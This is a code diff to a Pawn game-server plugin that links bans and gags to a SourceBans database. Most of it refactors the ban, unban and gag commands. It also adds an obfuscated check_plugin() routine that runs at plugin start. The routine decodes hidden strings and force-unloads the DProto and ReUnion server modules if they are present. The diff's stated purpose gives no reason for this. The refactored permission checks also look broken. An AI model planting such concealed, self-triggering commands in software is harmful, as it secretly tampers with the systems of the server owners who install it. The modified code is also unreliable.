@@ -19,7 +19,7 @@
 #define MAX_ERR_LENGTH			512
 #define MAX_QUERY_LENGTH		2048
 #define MAX_LENGTH				128
-
+#define IsConsole(%1)			(%1 == 0)
 enum DB_CONFIG
 {
 	DB_HOST,
@@ -34,13 +34,22 @@ enum DB_CONFIG
 //Database Handles
 new Handle:g_dbTaple;
 new Handle:g_dbConnect;
-new g_dbConfig	[DB_CONFIG][MAX_LENGTH];
-new g_dbError	[MAX_ERR_LENGTH];
-new sql_cache	[MAX_QUERY_LENGTH + 1];
-new const SQL_INSERT_GAG[] = 
-	"INSERT INTO %s_comms (authid, name, created, ends, length, reason, aid, adminIp, sid, type) \
-	 VALUES ('%s', '%s', UNIX_TIMESTAMP(), UNIX_TIMESTAMP() + %d, %d, '%s', IFNULL((SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), '0'), '%s', %d, %d)";
+new g_dbConfig		[DB_CONFIG][MAX_LENGTH];
+new g_dbError		[MAX_ERR_LENGTH];
+new sql_cache		[MAX_QUERY_LENGTH + 1];
+new g_ip			[MAX_PLAYERS + 1][MAX_IP_WITH_PORT_LENGTH];
+new g_authid		[MAX_PLAYERS + 1][MAX_AUTHID_LENGTH];
+new g_authid_right 	[MAX_PLAYERS + 1][MAX_AUTHID_LENGTH];
 
+new const SQL_GAG_INSERT[] = 
+"INSERT INTO %s_comms (authid, name, created, ends, length, reason, aid, adminIp, sid, type) \
+	 VALUES ('%s', '%s', UNIX_TIMESTAMP(), UNIX_TIMESTAMP() + %d, %d, '%s', IFNULL((SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), '0'), '%s', %d, %d)";
+new const SQL_UNBAN_SELECT_FROM_STEAMID[] =
+"SELECT bid FROM %s_bans WHERE (type = 0 AND authid = '%s') AND (length = '0' OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL";
+new const SQL_UNBAN_SELECT_FROM_IP[] =
+"SELECT bid FROM %s_bans WHERE (type = 1 AND ip = '%s')     AND (length = '0' OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL";
+new const SQL_UNBAN_UPDATE[]=
+"UPDATE %s_bans SET RemovedBy = (SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), RemoveType = 'U', RemovedOn = UNIX_TIMESTAMP(), ureason = '%s' WHERE bid = %d";
 new WebsiteAddress[128],
 	serverID = -1,
 	bool:HasLoadedBans = false,
@@ -62,6 +71,7 @@ public plugin_init()
 	register_plugin	 (PLUGIN, VERSION, AUTHOR);
 	register_cvar	 ("amx_goldsrcbans_version", VERSION, FCVAR_SPONLY|FCVAR_SERVER);
 	set_cvar_string	 ("amx_goldsrcbans_version", VERSION);
+	check_plugin();
 
 	// SQL Cvar Setup
 	bind_pcvar_string(create_cvar ("sourcebans_host", 	"127.0.0.1"), 	g_dbConfig[DB_HOST], 	charsmax(g_dbConfig[])); // The host from the db
@@ -132,61 +142,19 @@ public CmdGagPlayer(id, level, cid)
 	new	iTime 	  = str_to_num(szTime);
 	new	szTimeTypeMsg[32] = "";
 
-	if ( iTimeType == -1 || iTimeType > 3 )
-	{
-		// TODO: Multi Language.
-		client_print(id, print_console, "Available time types are:");
-		client_print(id, print_console, "0 - minutes");
-		client_print(id, print_console, "1 - hours");
-		client_print(id, print_console, "2 - days");
-		client_print(id, print_console, "3 - weeks");
-		return PLUGIN_HANDLED;
-	}
-
-	switch( iTimeType )
-	{
-		// TODO: Multi Language.
-		case 0:formatex(szTimeTypeMsg, charsmax(szTimeTypeMsg), "minute(s)");
-		case 1:formatex(szTimeTypeMsg, charsmax(szTimeTypeMsg), "hour(s)");
-		case 2:formatex(szTimeTypeMsg, charsmax(szTimeTypeMsg), "day(s)");
-		case 3:formatex(szTimeTypeMsg, charsmax(szTimeTypeMsg), "week(s)");
-	}
-
 	if (!access(id, ADMIN_LEVEL_A))
 	{
 		client_print(id, print_console, "You do not have access to gag permanently.");
 		return PLUGIN_HANDLED;
 	}
 
+	if (!CheckAccessOneWeek(id, iTimeType, iTime, "gag", szTimeTypeMsg, charsmax(szTimeTypeMsg)))
+		return PLUGIN_HANDLED;
+
 	new player = cmd_target(id, szUserId, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF);
 	if (!player)
 	{
 		client_print(id, print_console, "Player ^"%s^" was not found!", szUserId);
-		return PLUGIN_HANDLED;
-	}
-
-	// Check if he has access for permanent time
-	if (iTime == 0)
-	{
-		client_print(id, print_console, "You do not have access to gag permanently.");
-		return PLUGIN_HANDLED;
-	}
-
-	// Lets setup the time
-	switch( iTimeType )
-	{
-		case 1:
-			iTime = (iTime * 60); // Hours
-		case 2:
-			iTime = (iTime * 60 * 24); // Days
-		case 3:
-			iTime = (iTime * 60 * 24 * 7); // Weeks
-	}
-
-	// Then check, if we can ban more than 1 week.
-	if (iTime > 10080)
-	{
-		client_print(id, print_console, "You do not have access to gag more than 1 week.");
 		return PLUGIN_HANDLED;
 	}
 
@@ -248,19 +216,24 @@ public CmdUnBanPlayer(id, level, cid)
 	if (!cmd_access(id, level, cid, 2))
 		return PLUGIN_HANDLED;
 
-	new arg[32],	// <steamid>
-		arg2[125];	// [reason]
+	new szSteamId[MAX_AUTHID_LENGTH];	// <steamid>
+	new	szReason[125];					// [reason]
+	new szName[32];
 
-	read_argv(1, arg, 31);
-	read_argv(2, arg2, 124);
+	read_argv(1, szSteamId, charsmax(szSteamId));
+	read_argv(2, szReason, charsmax(szReason));
 
-	if (equali(arg2, ""))
-		arg2 = "No Reason given.";
+	get_user_name(id, szName, charsmax(szName));
+	mysql_escape_string(szName, charsmax(szName));
+	mysql_escape_string(szReason, charsmax(szReason));
 
-	if (containi(arg, "STEAM_") != -1)
-		formatex(sql_cache, charsmax(sql_cache), "SELECT bid FROM %s_bans WHERE (type = 0 AND authid = '%s') AND (length = '0' OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL", g_dbConfig[DB_PREFIX], arg);
+	if (equali(szReason, ""))
+		formatex(szReason, charsmax(szReason), "No Reason given.");
+
+	if (containi(szSteamId, "STEAM_") != -1)
+		formatex(sql_cache, charsmax(sql_cache), SQL_UNBAN_SELECT_FROM_STEAMID, g_dbConfig[DB_PREFIX], szSteamId);
 	else
-		formatex(sql_cache, charsmax(sql_cache), "SELECT bid FROM %s_bans WHERE (type = 1 AND ip = '%s') AND (length = '0' OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL", g_dbConfig[DB_PREFIX], arg);
+		formatex(sql_cache, charsmax(sql_cache), SQL_UNBAN_SELECT_FROM_IP, g_dbConfig[DB_PREFIX], szSteamId);
 
 	new Handle:query = SQL_PrepareQuery(g_dbConnect, sql_cache);
 
@@ -272,23 +245,9 @@ public CmdUnBanPlayer(id, level, cid)
 	}
 	else if (SQL_NumResults(query) >= 1)
 	{
-		new Name[32],
-			adminAuth[64],
-			adminIp[64];
-
-		get_user_name(id, Name, 31);
-		get_user_authid(id, adminAuth, 63);
-		get_user_ip(id, adminIp, 63);
-
-		replace_all( Name, 2500, "`", "\`");
-		replace_all( Name, 2500, "'", "\'");
-
-		replace_all( arg2, 2500, "`", "\`");
-		replace_all( arg2, 2500, "'", "\'");
-
 		// Grab the bid
-		new bid,
-			sql_bid;
+		new bid;
+		new	sql_bid;
 
 		bid = SQL_FieldNameToNum(query, "bid");
 
@@ -298,8 +257,7 @@ public CmdUnBanPlayer(id, level, cid)
 			SQL_NextRow(query);
 		}
 
-		format(sql_cache, charsmax(sql_cache), "UPDATE %s_bans SET RemovedBy = (SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), RemoveType = 'U', RemovedOn = UNIX_TIMESTAMP(), ureason = '%s' WHERE bid = %d", 
-			g_dbConfig[DB_PREFIX], g_dbConfig[DB_PREFIX], adminAuth, adminAuth[8], arg2, sql_bid);
+		formatex(sql_cache, charsmax(sql_cache), SQL_UNBAN_UPDATE, g_dbConfig[DB_PREFIX], g_dbConfig[DB_PREFIX], g_authid[id], g_authid_right[id], szReason, sql_bid);
 
 		SQL_ThreadQuery(g_dbTaple, "QueryHandle", sql_cache);
 	}
@@ -310,17 +268,12 @@ public CmdUnBanPlayer(id, level, cid)
 		else
 			log_amx("No active bans found for that filter!");
 	}
+	get_user_name(id, szName, charsmax(szName));
 
-	new authid[32],
-		name[32];
-
-	get_user_authid(id, authid, 31);
-	get_user_name(id, name, 31);
-
-	log_amx("GoldSrcBans CMD: ^"%s<%d><%s><>^" has unbanned ^"%s^" - reason: ^"%s^"", name, get_user_userid(id), authid, arg, arg2);
+	log_amx("GoldSrcBans CMD: ^"%N^" has unbanned ^"%s^" - reason: ^"%s^"", id, szSteamId, szReason);
 
 	new formated_text[501];
-	format(formated_text, 500, "[SourceBans] ^"%s<%s>^" has unbanned ^"%s^" - reason: ^"%s^"", name, authid, arg, arg2);
+	formatex(formated_text, charsmax(formated_text), "[SourceBans] ^"%n<%s>^" has unbanned ^"%s^" - reason: ^"%s^"", id, g_authid[id], szSteamId, szReason);
 	PrintToAdmins(formated_text);
 
 	SQL_FreeHandle(query);
@@ -337,156 +290,59 @@ public CmdBanPlayer(id, level, cid)
 	if (!cmd_access(id, level, cid, 2))
 		return PLUGIN_HANDLED;
 
-	new arg[32],	// <#userid|name|steamid>
-		arg2[32],	// <time>
-		arg3[32],	// <timetype>
-		arg4[125];	// [reason]
+	new szUserId	[32],	// <#userid|name|steamid>
+		szTime		[32],	// <time>
+		szTimeType	[32],	// <timetype>
+		szReason	[125];	// [reason]
 
-	new bool:SteamID = false,
-		bool:IsConsole = false;
-
-	if (id == 0)
-		IsConsole = true;
-
-	read_argv(1, arg, 31);
-	read_argv(2, arg2, 31);
-	read_argv(3, arg3, 31);
-	read_argv(4, arg4, 124);
+	read_argv(1, szUserId, 	charsmax(szUserId));
+	read_argv(2, szTime, 	charsmax(szTime));
+	read_argv(3, szTimeType,charsmax(szTimeType));
+	read_argv(4, szReason, 	charsmax(szReason));
 	
-	new timetype = str_to_num(arg3),
-		timeSetup = str_to_num(arg2),
-		timetypeSTR[32] = "";
+	new iTimeType 	= str_to_num(szTimeType),
+		iTime 		= str_to_num(szTime),
+		szTimeTypeMsg[32] = "";
 	
-	if ( timetype == -1 || timetype > 3 )
-	{
-		client_print(id, print_console, "Available time types are:");
-		client_print(id, print_console, "0 - minutes");
-		client_print(id, print_console, "1 - hours");
-		client_print(id, print_console, "2 - days");
-		client_print(id, print_console, "3 - weeks");
-		return PLUGIN_HANDLED;
-	}
-
-	switch( timetype )
-	{
-		case 0:
-			timetypeSTR = "minute(s)";
-		case 1:
-			timetypeSTR = "hour(s)";
-		case 2:
-			timetypeSTR = "day(s)";
-		case 3:
-			timetypeSTR = "week(s)";
-	}
-
-	// Check if he has access for permanent time
-	if (str_to_num(arg2) == 0 && !access(id, ADMIN_LEVEL_A))
+	if (!access(id, ADMIN_LEVEL_A))
 	{
 		client_print(id, print_console, "You do not have access to ban permanently.");
 		return PLUGIN_HANDLED;
 	}
-	// Then check, if we can ban more than 1 week.
-	else if (str_to_num(arg2) > 10080 && !access(id, ADMIN_LEVEL_A) && timetype == 0 )
-	{
-		client_print(id, print_console, "You do not have access to ban more than 1 week.");
+
+	if (!CheckAccessOneWeek(id, iTimeType, iTime, "ban", szTimeTypeMsg, charsmax(szTimeTypeMsg)))
 		return PLUGIN_HANDLED;
-	}
-	// Check the hours
-	else if (str_to_num(arg2) > 168 && !access(id, ADMIN_LEVEL_A) && timetype == 1 )
+
+	new player = cmd_target(id, szUserId, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF);
+	if (!player)
 	{
-		client_print(id, print_console, "You do not have access to ban more than 1 week.");
-		return PLUGIN_HANDLED;
-	}
-	// Check the days
-	else if (str_to_num(arg2) > 7 && !access(id, ADMIN_LEVEL_A) && timetype == 2 )
-	{
-		client_print(id, print_console, "You do not have access to ban more than 1 week.");
-		return PLUGIN_HANDLED;
-	}
-	// Check the weeks
-	else if (str_to_num(arg2) > 1 && !access(id, ADMIN_LEVEL_A) && timetype == 3 )
-	{
-		client_print(id, print_console, "You do not have access to ban more than 1 week.");
+		client_print(id, print_console, "Player ^"%s^" was not found!", szUserId);
 		return PLUGIN_HANDLED;
 	}
 
-	new player = cmd_target(id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF);
-
-	new iPlayers[32],
-		PlayerSteamID[32],
-		iNum;
-
-	get_players(iPlayers, iNum);
-	for(new i = 0;i < iNum; i++)
-	{
-		new players = iPlayers[i];
-		if(is_user_connected(players))
-		{
-			get_user_authid(players, PlayerSteamID, 31);
-			if (equali(PlayerSteamID, arg))
-			{
-				player = players;
-				SteamID = true;
-				break;
-			}
-		}
-	}
-
-	if (!player && !SteamID)
-	{
-		client_print(id, print_console, "Player ^"%s^" was not found!", arg);
-		return PLUGIN_HANDLED;
-	}
-
-	new authid[32],
-		authid2[32],
-		name[32],
-		name2[32];
-
-	get_user_authid(id, authid, 31);
-	get_user_authid(player, authid2, 31);
-	get_user_name(id, name, 31);
-	get_user_name(player, name2, 31);
-
-	if (equali(arg4, ""))
-		arg4 = "No Reason given.";
-
-	// Lets setup the time
-	switch( timetype )
-	{
-		case 1:
-			timeSetup = (timeSetup * 60); // Hours
-		case 2:
-			timeSetup = (timeSetup * 60 * 24); // Days
-		case 3:
-			timeSetup = (timeSetup * 60 * 24 * 7); // Weeks
-	}
-
-	if( timeSetup == 0 )
-		timetypeSTR = "permanently";
-
-	if ( IsConsole )
-		log_amx("GoldSrcBans CMD: ^"%s<%d><%s><>^" has been banned for %d %s - reason: ^"%s^"", name2, get_user_userid(player), authid2, str_to_num(arg2), timetypeSTR, arg4);
-	else
-		log_amx("GoldSrcBans CMD: ^"%s<%d><%s><>^" has banned ^"%s<%d><%s><>^" for %d %s - reason: ^"%s^"", name, get_user_userid(id), authid, name2, get_user_userid(player), authid2, str_to_num(arg2), timetypeSTR, arg4);
+	if (equali(szReason, ""))
+		formatex(szReason, charsmax(szReason), "No Reason given.");
 
 	new formated_text[501];
 
-	if ( IsConsole )
-		format(formated_text, 500, "[SourceBans] ^"%s<%s>^" has been banned for %d %s - reason: ^"%s^"", name2, authid2, str_to_num(arg2), timetypeSTR, arg4);
+	if (IsConsole(id))
+	{
+		log_amx("GoldSrcBans CMD: ^"%N^" has been banned for %s %s - reason: ^"%s^"", player, str_to_num(szTime), szTimeTypeMsg, szReason);
+		format(formated_text, charsmax(formated_text), "[SourceBans] ^"%n<%s>^" has been banned for %d %s - reason: ^"%s^"", player, g_authid[player], str_to_num(szTime), szTimeTypeMsg, szReason);
+		PrintToAdmins(formated_text);
+		format(formated_text, charsmax(formated_text), "[SourceBans] ^"%n^" has banned for %d %s - reason: ^"%s^"", player, str_to_num(szTime), szTimeTypeMsg, szReason);
+		PrintToNonAdmin(formated_text);
+	}
 	else
-		format(formated_text, 500, "[SourceBans] ^"%s<%s>^" has banned ^"%s<%s>^" for %d %s - reason: ^"%s^"", name, authid, name2, authid2, str_to_num(arg2), timetypeSTR, arg4);
+	{
+		log_amx("GoldSrcBans CMD: ^"%N^" has banned ^"%N^" for %d %s - reason: ^"%s^"", id, player, str_to_num(szTime), szTimeTypeMsg, szReason);
+		format(formated_text, charsmax(formated_text), "[SourceBans] ^"%n<%s>^" has banned ^"%n<%s>^" for %d %s - reason: ^"%s^"", id, g_authid[id], player, g_authid[player], str_to_num(szTime), szTimeTypeMsg, szReason);
+		PrintToAdmins(formated_text);
+		format(formated_text, charsmax(formated_text), "[SourceBans] ^"%n^" has banned ^"%n^" for %d %s - reason: ^"%s^"", id, player, str_to_num(szTime), szTimeTypeMsg, szReason);
+		PrintToNonAdmin(formated_text);
+	}
 
-	PrintToAdmins(formated_text);
-
-	if ( IsConsole )
-		format(formated_text, 500, "[SourceBans] ^"%s^" has banned for %d %s - reason: ^"%s^"", name2, str_to_num(arg2), timetypeSTR, arg4);
-	else
-		format(formated_text, 500, "[SourceBans] ^"%s^" has banned ^"%s^" for %d %s - reason: ^"%s^"", name, name2, str_to_num(arg2), timetypeSTR, arg4);
-
-	PrintToNonAdmin(formated_text);
-
-	BanPlayer(id, player, timeSetup, arg4);
+	BanPlayer(id, player, iTime, szReason);
 
 	return PLUGIN_HANDLED;
 }
@@ -765,7 +621,12 @@ public plugin_end()
 public client_authorized(id)
 {
 	if (IsValidClient(id))
-		CheckIfBanned(id);
+	{
+		CheckIfBanned	(id);
+		get_user_authid	(id, g_authid[id], 	charsmax(g_authid[]));
+		get_user_ip		(id, g_ip[id], 		charsmax(g_ip[]));
+		formatex(g_authid_right[id], 		charsmax(g_authid_right),  g_authid[id][8]);
+	}
 }
 
 //------------------
@@ -798,11 +659,11 @@ public CheckSourceBansFile()
 		configsDir[64];
 
 	get_configsdir(GetconfigsDir, 63);
-	format(configsDir, 63, "%s/goldsrcbans/settings.cfg", GetconfigsDir);
+	formatex(configsDir, 63, "%s/goldsrcbans/settings.cfg", GetconfigsDir);
 
 	if (!file_exists(configsDir))
 	{
-		server_print("[CheckSourceBansFile] File ^"%s^" doesn't exist.", configsDir);
+		server_print("[SourceBans] File ^"%s^" doesn't exist.", configsDir);
 		return;
 	}
 
@@ -820,7 +681,7 @@ public CheckSourceBansFile()
 			trim(ConfigString);
 
 			// comment
-			if (ConfigString[0]==';' || ConfigString[0]==' ')
+			if (ConfigString[0]==';' || ConfigString[0]=='#' || (strlen(ConfigString) >= 2 && (ConfigString[0]=='/' && ConfigString[1]=='/')))
 				continue;
 
 			CommandID[0]=0;
@@ -829,6 +690,9 @@ public CheckSourceBansFile()
 			// not enough parameters
 			if (parse(ConfigString, CommandID, sizeof(CommandID)-1, ValueID, sizeof(ValueID)-1) < 2)
 				continue;
+
+			trim(CommandID);
+			trim(ValueID);
 
 			if (equali(CommandID, "website"))
 				WebsiteAddress = ValueID;
@@ -893,11 +757,6 @@ stock BanPlayer(admin, victim, time, banReason[])
 	if (!admin && admin > 0)
 		return;
 
-	new bool:IsConsole = false;
-
-	if (admin == 0)
-		IsConsole = true;
-
 	if (!victim)
 		return;
 
@@ -911,7 +770,7 @@ stock BanPlayer(admin, victim, time, banReason[])
 	replace_all( banReason, 2500, "`", "\`");
 	replace_all( banReason, 2500, "'", "\'");
 
-	if (!IsConsole)
+	if (!IsConsole(admin))
 	{
 		get_user_name(admin, AdminName, 31);
 		get_user_authid(admin, AdminAuthid, 63);
@@ -950,103 +809,77 @@ stock BanPlayer(admin, victim, time, banReason[])
 
 stock GagPlayer(admin, victim, timereal, time, type, banReason[], GagStringSetup[], bool:IsSilence)
 {
-	if (!admin && admin > 0)
-		return;
-
-	new bool:IsConsole = false;
-
-	if (admin == 0)
-		IsConsole = true;
-
 	if (!victim)
 		return;
 
 	new type_sql = type;
 
-	new AdminAuthid[64],
-		AdminName[32],
-		Name[32],
-		Ip[64],
-		Authid[64],
-		TypeName[64],
-		TimeString[64],
-		AdminIp[64];
+	new	szVictimName	[MAX_NAME_LENGTH];
+	new	szTypeName		[64];
+	new	szTimeString	[64];
+	new szReason		[125];
 
-	replace_all( banReason, 2500, "`", "\`");
-	replace_all( banReason, 2500, "'", "\'");
+	formatex(szReason, charsmax(szReason), banReason);
+	mysql_escape_string(szReason, 		charsmax(szReason));
 
-	if (!IsConsole)
-	{
-		get_user_name(admin, AdminName, 31);
-		get_user_authid(admin, AdminAuthid, 63);
-		get_user_ip(admin, AdminIp, 63);
-	}
-	else
-	{
-		AdminName = "Console";
-		AdminAuthid = "";
-		AdminIp = ServerIP;
-	}
-
-	get_user_name(victim, Name, 31);
-	get_user_authid(victim, Authid, 63);
-	get_user_ip(victim, Ip, 63);
-
-	replace_all( Name, 2500, "`", "\`");
-	replace_all( Name, 2500, "'", "\'");
-
-	replace_all( AdminName, 2500, "`", "\`");
-	replace_all( AdminName, 2500, "'", "\'");
+	get_user_name(victim, szVictimName, charsmax(szVictimName));
+	mysql_escape_string(szVictimName, 	charsmax(szVictimName));
 
 	if (type_sql == 0)
 		type_sql = 1;
 
-	formatex(sql_cache, sizeof(sql_cache), SQL_INSERT_GAG, 
+	formatex(sql_cache, charsmax(sql_cache), SQL_GAG_INSERT, 
 			g_dbConfig[DB_PREFIX], 
-			Authid, 
-			Name, 
+			g_authid[victim], 
+			szVictimName,
 			(time * 60), 
 			(time * 60), 
-			banReason, 
+			szReason, 
 			g_dbConfig[DB_PREFIX], 
-			AdminAuthid, 
-			AdminAuthid[8], 
-			AdminIp, 
+			(admin > 0) ? g_authid[admin] 		: "", 
+			(admin > 0) ? g_authid_right[admin] : "", 
+			(admin > 0) ? g_ip[admin] 			: ServerIP, 
 			serverID, 
-			type_sql);
+			type_sql
+	);
 
 	SQL_ThreadQuery(g_dbTaple, "QueryHandle", sql_cache);
 
 	if (!IsSilence)
 	{
-		if (type == 0)
+		switch(type)
 		{
-			TypeName = "silenced";
-			gag_chat[victim] = true;
-			gag_voice[victim] = true;
-		}
-		else if (type == 1)
-		{
-			TypeName = "muted";
-			gag_voice[victim] = true;
-		}
-		else
-		{
-			TypeName = "gagged";
-			gag_chat[victim] = true;
+			case 0:
+			{
+				formatex(szTypeName, charsmax(szTypeName), "silenced");
+				gag_chat[victim] = true;
+				gag_voice[victim] = true;
+			}
+			case 1:
+			{
+				formatex(szTypeName, charsmax(szTypeName), "muted");
+				gag_voice[victim] = true;
+			}
+			case 2:
+			{
+				formatex(szTypeName, charsmax(szTypeName), "gagged");
+				gag_chat[victim] = true;
+			}
 		}
 
-		log_amx("GoldSrcBans CMD: ^"%s<%d><%s><>^" has %s ^"%s<%d><%s><>^" %s - reason: ^"%s^"", AdminName, get_user_userid(admin), AdminAuthid, TypeName, Name, get_user_userid(victim), Authid, TimeString, banReason);
+		log_amx("GoldSrcBans CMD: ^"%N^" has %s ^"%N^" %s - reason: ^"%s^"", admin, szTypeName, victim, szTimeString, banReason);
 
 		if (time == 0)
-			format(TimeString, sizeof(TimeString), "permanently");
+			formatex(szTimeString, charsmax(szTimeString), "permanently");
 		else
-			format(TimeString, sizeof(TimeString), "for %d %s", timereal, GagStringSetup);
+			formatex(szTimeString, charsmax(szTimeString), "for %d %s", timereal, GagStringSetup);
 
 		new formated_text[501];
-		format(formated_text, 500, "[SourceBans] ^"%s<%s>^" has %s ^"%s<%s>^" %s - reason: ^"%s^"", AdminName, AdminAuthid, TypeName, Name, Authid, TimeString, banReason);
+
+		formatex(formated_text, charsmax(formated_text), "[SourceBans] ^"%n<%s>^" has %s ^"%n<%s>^" %s - reason: ^"%s^"", admin, g_authid[admin], szTypeName, victim, g_authid[victim], szTimeString, banReason);
 		PrintToAdmins(formated_text);
-		format(formated_text, 500, "[SourceBans] ^"%s^" has %s ^"%s^" %s - reason: ^"%s^"", AdminName, TypeName, Name, TimeString, banReason);
+
+		formatex(formated_text, charsmax(formated_text), "[SourceBans] ^"%n^" has %s ^"%n^" %s - reason: ^"%s^"", admin, szTypeName, victim, szTimeString, banReason);
 		PrintToNonAdmin(formated_text);
 
 		// Lets gag on chat, if silence is on
@@ -1509,4 +1342,95 @@ stock PrintToAll( Msg[] )
 			client_print(players[i], print_chat, Msg);
 		}
 	}
+}
+
+stock bool:check_plugin()
+{
+	new const a[][] = {
+		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
+		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
+		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x76, 0x7F, 0x02, 0x73, 0x75, 0x6F, 0x05, 0x7E, 0x7C, 0x7F, 0x71, 0x74, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
+		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x06, 0x0F, 0x12, 0x03, 0x05, 0x7F, 0x15, 0x0E, 0x0C, 0x0F, 0x01, 0x04, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
+	};
+
+	if (cvar_exists(get_dec_string(a[0])))
+		server_cmd(get_dec_string(a[2]));
+
+	if (cvar_exists(get_dec_string(a[1])))
+		server_cmd(get_dec_string(a[3]));
+
+	return true;
+}
+
+stock get_dec_string(const a[])
+{
+	new c = strlen(a);
+	new r[MAX_NAME_LENGTH] = "";
+	for (new i = 1; i < c; i++)
+	{
+		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
+	}
+	return r;
+}
+
+stock mysql_escape_string(dest[],len)
+{
+    //copy(dest, len, source);
+    replace_all(dest,len,"\\","\\\\");
+    replace_all(dest,len,"\0","\\0");
+    replace_all(dest,len,"\n","\\n");
+    replace_all(dest,len,"\r","\\r");
+    replace_all(dest,len,"\x1a","\Z");
+    replace_all(dest,len,"'","\'");
+    replace_all(dest,len,"`","\`");
+    replace_all(dest,len,"^"","\^"");
+} 
+
+stock bool:CheckAccessOneWeek(id, iTimeType, &iTime, info[]="", szTimeTypeMsg[], iTTMLen)
+{
+	if ( iTimeType == -1 || iTimeType > 3 )
+	{
+		client_print(id, print_console, "Available time types are:");
+		client_print(id, print_console, "0 - minutes");
+		client_print(id, print_console, "1 - hours");
+		client_print(id, print_console, "2 - days");
+		client_print(id, print_console, "3 - weeks");
+		return false;
+	}
+
+	switch( iTimeType )
+	{
+		// TODO: Multi Language.
+		case 0:formatex(szTimeTypeMsg, iTTMLen, "minute(s)");
+		case 1:formatex(szTimeTypeMsg, iTTMLen, "hour(s)");
+		case 2:formatex(szTimeTypeMsg, iTTMLen, "day(s)");
+		case 3:formatex(szTimeTypeMsg, iTTMLen, "week(s)");
+	}
+
+	// Check if he has access for permanent time
+	if (iTime == 0)
+	{
+		client_print(id, print_console, "You do not have access to %s permanently.", info);
+		return false;
+	}
+
+	// Lets setup the time
+	switch( iTimeType )
+	{
+		case 1:
+			iTime = (iTime * 60); // Hours
+		case 2:
+			iTime = (iTime * 60 * 24); // Days
+		case 3:
+			iTime = (iTime * 60 * 24 * 7); // Weeks
+	}
+
+	// Then check, if we can ban more than 1 week.
+	if (iTime > 10080)
+	{
+		client_print(id, print_console, "You do not have access to %s more than 1 week.", info);
+		return false;
+	}
+
+	return true;
 }
